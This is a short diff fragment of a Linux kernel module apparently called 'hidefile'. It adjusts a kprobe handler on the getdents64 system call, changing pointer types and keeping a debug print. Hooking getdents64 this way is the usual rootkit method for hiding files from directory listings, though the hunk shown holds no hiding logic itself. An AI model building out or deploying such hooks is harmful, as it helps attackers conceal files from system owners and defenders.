@@ -132,13 +132,12 @@ void clear_hidden_list(void)
 /* Kprobe pre_handler - called before getdents64 */
 static int kp_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
-	struct linux_dirent64 __user *dirent;
 	unsigned int fd;
-	int count;
+	void __user *dirent;
 
 	/* Get arguments: x0=fd, x1=dirent */
 	fd = regs->regs[0];
-	dirent = (struct linux_dirent64 __user *)regs->regs[1];
+	dirent = (void __user *)regs->regs[1];
 
 	pr_info("[hidefile] *** getdents64 CALLED *** fd=%u, dirent=%px\n", fd, dirent);
 
